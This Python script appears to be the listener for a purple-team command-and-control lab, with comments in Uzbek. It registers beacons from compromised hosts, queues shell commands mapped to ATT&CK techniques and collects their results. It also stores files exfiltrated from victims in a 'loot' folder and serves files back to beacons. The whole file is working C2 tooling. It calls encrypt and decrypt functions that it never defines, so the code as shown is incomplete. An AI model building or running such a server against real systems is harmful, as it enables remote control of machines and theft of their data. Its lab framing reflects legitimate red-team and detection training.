#!/usr/bin/env python3
"""Purple Team C2 LAB listener: tasking, file ops, ATT&CK mapping, jurnal."""

import argparse
import base64
import json
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

from Crypto.Cipher import AES
from db import db, log

con = db()


class Handler(BaseHTTPRequestHandler):

    def _enc_resp(self, obj):
        body = encrypt(json.dumps(obj).encode())
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        url = urlparse(self.path)
        qs = parse_qs(url.query)

        if url.path == "/checkin":
            try:
                info = json.loads(decrypt(base64.b64decode(qs["d"][0])))
            except Exception:
                return self.send_error(400)
            bid = info["bid"]
            now = time.strftime("%Y-%m-%d %H:%M:%S")
            con.execute("""INSERT INTO beacons(bid,hostname,user,os,first_seen,last_seen,ip,sleep)
                           VALUES(?,?,?,?,?,?,?,?)
                           ON CONFLICT(bid) DO UPDATE SET last_seen=?, ip=?""",
                        (bid, info["hostname"], info["user"], info["os"], now, now,
                         self.client_address[0], info.get("sleep", 10), now,
                         self.client_address[0]))
            log(con, bid, "checkin", f"ip={self.client_address[0]}")

            # navbatdagi task (shu bid uchun)
            row = con.execute(
                "SELECT id, command, attack_id FROM tasks WHERE bid=? AND status='queued' "
                "ORDER BY id LIMIT 1", (bid,)).fetchone()
            if row:
                con.execute("UPDATE tasks SET status='sent', sent=? WHERE id=?", (now, row["id"]))
                log(con, bid, "task_sent", f"[{row['attack_id']}] {row['command']}")
                payload = {"task_id": row["id"], "command": row["command"],
                           "attack_id": row["attack_id"], "type": "shell"}
            else:
                payload = {}
            con.commit()
            return self._enc_resp(payload)

        # fayl yuklab olish (download): beacon GET /get?b=<bid>&n=<b64name>
        if url.path == "/get":
            bid = qs.get("b", [""])[0]
            fname = base64.b64decode(qs.get("n", [""])[0]).decode()
            import os
            path = os.path.join("loot", bid, os.path.basename(fname))
            try:
                with open(path, "rb") as f:
                    data = f.read()
                log(con, bid, "file_download", f"{fname} ({len(data)}B)")
                body = encrypt(data)
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            except FileNotFoundError:
                self.send_error(404, "loot topilmadi")
            return

        self.send_error(404)

    def do_POST(self):
        url = urlparse(self.path)

        # shell natijasi
        if url.path == "/submit":
            res = json.loads(decrypt(self.rfile.read(int(self.headers["Content-Length"]))))
            con.execute("UPDATE tasks SET status='done', result=? WHERE id=?",
                        (res["output"], res["task_id"]))
            log(con, res["bid"], "result", f"task={res['task_id']}")
            con.commit()
            return self._enc_resp({"ok": True})

        # upload (beacon -> C2): POST /upload?b=<bid>&n=<b64name>
        if url.path == "/upload":
            qs = parse_qs(url.query)
            bid = qs.get("b", ["unknown"])[0]
            fname = base64.b64decode(qs.get("n", ["x"])[0]).decode()
            import os
            data = decrypt(self.rfile.read(int(self.headers["Content-Length"])))
            os.makedirs(os.path.join("loot", bid), exist_ok=True)
            path = os.path.join("loot", bid, os.path.basename(fname))
            with open(path, "wb") as f:
                f.write(data)
            con.execute("INSERT INTO files(bid,direction,filename,size,ts) VALUES(?,?,?,?,?)",
                        (bid, "upload", fname, len(data), time.strftime("%Y-%m-%d %H:%M:%S")))
            log(con, bid, "file_upload", f"{fname} ({len(data)}B)")
            con.commit()
            return self._enc_resp({"ok": True})

        self.send_error(404)

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="C2 Lab listener")
    ap.add_argument("-p", "--port", type=int, default=8443)
    args = ap.parse_args()
    import os
    os.makedirs("loot", exist_ok=True)
    print(f"[+] C2 listener: 0.0.0.0:{args.port}  (DB: c2lab.db, loot/ papkasi)")
    HTTPServer(("0.0.0.0", args.port), Handler).serve_forever()
